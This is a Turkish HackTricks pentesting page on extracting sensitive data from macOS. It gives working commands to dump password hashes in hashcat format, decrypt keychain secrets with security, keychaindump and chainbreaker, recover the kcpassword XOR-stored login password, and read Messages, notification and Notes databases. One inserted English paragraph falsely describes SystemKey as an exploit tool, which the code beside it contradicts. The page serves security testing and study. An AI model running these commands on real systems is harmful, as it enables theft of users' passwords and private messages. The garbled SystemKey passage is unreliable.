# macOS Hassas Konumlar

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek paylaşın**.

</details>

## Parolalar

### Shadow Parolaları

Shadow parolaları, kullanıcının yapılandırmasıyla birlikte **`/var/db/dslocal/nodes/Default/users/`** konumunda bulunan plist dosyalarında depolanır.\
Aşağıdaki oneliner, **kullanıcılar hakkında tüm bilgileri** (hash bilgileri dahil) dökmek için kullanılabilir:

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**Bu gibi betikler**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) veya [**bu gibi**](https://github.com/octomagon/davegrohl.git) kullanılarak hash'i **hashcat** **formatına** dönüştürmek için kullanılabilir.

Tüm hizmet hesaplarının olmayan kullanıcıların kimlik bilgilerini `-m 7100` (macOS PBKDF2-SHA512) hashcat formatında dökümleyen alternatif bir tek satırlık komut: 

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### Anahtar Zinciri Dökümü

Not: Şifreleri çözülmüş olarak dökmek için security binary'sini kullanırken, kullanıcıya bu işlemi yapmasına izin vermesi için birkaç uyarı gelecektir.
```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
Bu yorumdan [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) yola çıkarak, bu araçların Big Sur'da artık çalışmadığı görünüyor.
{% endhint %}

### Keychaindump Genel Bakışı

**keychaindump** adında bir araç, macOS anahtar zincirlerinden şifreleri çıkarmak için geliştirilmiştir, ancak Big Sur gibi daha yeni macOS sürümlerinde sınırlamalarla karşılaşır, [tartışmada](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) belirtildiği gibi. **keychaindump**'ın kullanımı, saldırganın **root** erişimi elde etmesi ve ayrıcalıkları yükseltmesi gerektirir. Araç, anahtar zincirinin kullanıcı girişiyle varsayılan olarak kilidini açık tutması nedeniyle uygulamaların kullanıcı şifresini tekrar tekrar sormadan erişmesine olanak tanır. Ancak, bir kullanıcının her kullanımdan sonra anahtar zincirini kilitlemeyi tercih etmesi durumunda, **keychaindump** etkisiz hale gelir.

**Keychaindump**, Apple tarafından yetkilendirme ve şifreleme işlemleri için kritik olan bir **securityd** adlı özel bir işlemi hedef alarak çalışır. Çıkarma işlemi, kullanıcının giriş şifresinden türetilen bir **Anahtar Anahtarı**'nı belirlemeyi içerir. Bu anahtar, anahtar zinciri dosyasını okumak için önemlidir. **Keychaindump**, potansiyel anahtarları **MALLOC_TINY** olarak işaretlenen alanlarda arayan `vmmap` komutunu kullanarak **securityd**'nin bellek yığını üzerinde tarama yapar. Bu bellek konumlarını incelemek için aşağıdaki komut kullanılır:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Potansiyel anahtarları belirledikten sonra, **keychaindump**, anahtar adayını gösteren (`0x0000000000000018`) belirli bir deseni aramak için heap'leri tarar. Bu anahtarı kullanmak için, **keychaindump**'ın kaynak kodunda belirtildiği gibi, deobfuscation gibi ilave adımlar gereklidir. Bu alana odaklanan analistler, anahtar zincirini şifrelemek için önemli verilerin **securityd** işleminin belleğinde depolandığını unutmamalıdır. **keychaindump**'ı çalıştırmak için bir örnek komut:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker), aşağıdaki türdeki bilgileri OSX anahtar zincirinden forensik olarak çıkarmanızı sağlar:

* Hashlenmiş Anahtar Zinciri şifresi, [hashcat](https://hashcat.net/hashcat/) veya [John the Ripper](https://www.openwall.com/john/) ile kırılmak için uygundur.
* İnternet Şifreleri
* Genel Şifreler
* Özel Anahtarlar
* Genel Anahtarlar
* X509 Sertifikaları
* Güvenli Notlar
* Appleshare Şifreleri

Anahtar zinciri kilidini açma şifresi, [volafox](https://github.com/n0fate/volafox) veya [volatility](https://github.com/volatilityfoundation/volatility) ile elde edilen bir anahtar veya SystemKey gibi bir açma dosyası ile birlikte, Chainbreaker ayrıca düz metin şifreler sağlar.

Anahtar Zincirini kilitlemek için bu yöntemlerden birine sahip olmadan, Chainbreaker diğer tüm mevcut bilgileri görüntüler.

#### **Anahtar zinciri anahtarlarını dökün**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **SystemKey ile anahtar zinciri anahtarlarını (şifreleriyle birlikte) dökün**

SystemKey is a tool that can be used to dump keychain keys, including passwords, from a macOS system. It takes advantage of a vulnerability in the macOS keychain system to extract sensitive information.

To use SystemKey, follow these steps:

1. Download and compile the SystemKey tool from the official GitHub repository.
2. Run the SystemKey tool with administrative privileges.
3. The tool will automatically search for and dump all keychain keys, including passwords, to a file.

Please note that using SystemKey to dump keychain keys is considered a privilege escalation technique and may be illegal or unethical without proper authorization. Always ensure you have the necessary permissions and legal rights before attempting any hacking or penetration testing activities.
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Anahtarlık anahtarlarını (şifreleriyle birlikte) hash'i kırarak dökün**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Bellek dökümü ile anahtar zinciri anahtarlarını (parolalarla birlikte) dökün**

Bir **bellek dökümü** gerçekleştirmek için [şu adımları takip edin](..#osxpmem-ile-bellek-dökümü-yapma)
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Kullanıcı şifresini kullanarak anahtar zinciri anahtarlarını (şifreleriyle birlikte) dökün**

Kullanıcının şifresini biliyorsanız, bunu kullanarak kullanıcıya ait anahtar zincirlerini döküp şifreleyebilirsiniz.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

**kcpassword** dosyası, sistem sahibi **otomatik girişi etkinleştirdiyse** kullanıcının giriş şifresini tutan bir dosyadır. Bu nedenle, kullanıcıya şifre sorulmadan otomatik olarak giriş yapılır (bu çok güvenli değildir).

Şifre, **`/etc/kcpassword`** dosyasında **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** anahtarıyla xorlanmış olarak saklanır. Kullanıcının şifresi anahtardan daha uzunsa, anahtar tekrar kullanılır.\
Bu, şifrenin oldukça kolay bir şekilde kurtarılmasını sağlar, örneğin [**bu gibi**](https://gist.github.com/opshope/32f65875d45215c3677d) betikler kullanılarak.

## Veritabanlarında İlginç Bilgiler

### Mesajlar
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Bildirimler

Bildirim verilerini `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/` konumunda bulabilirsiniz.

İlginç bilgilerin çoğu **blob** içinde olacak. Bu nedenle, içeriği **çıkarmak** ve **insan tarafından okunabilir** hale getirmek veya **`strings`** kullanmak gerekecektir. Buna erişmek için şunları yapabilirsiniz:

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
### Notlar

Kullanıcıların **notları**, `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite` içinde bulunabilir.

{% endcode %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}

<details>

<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarına **PR göndererek paylaşın**.

</details>
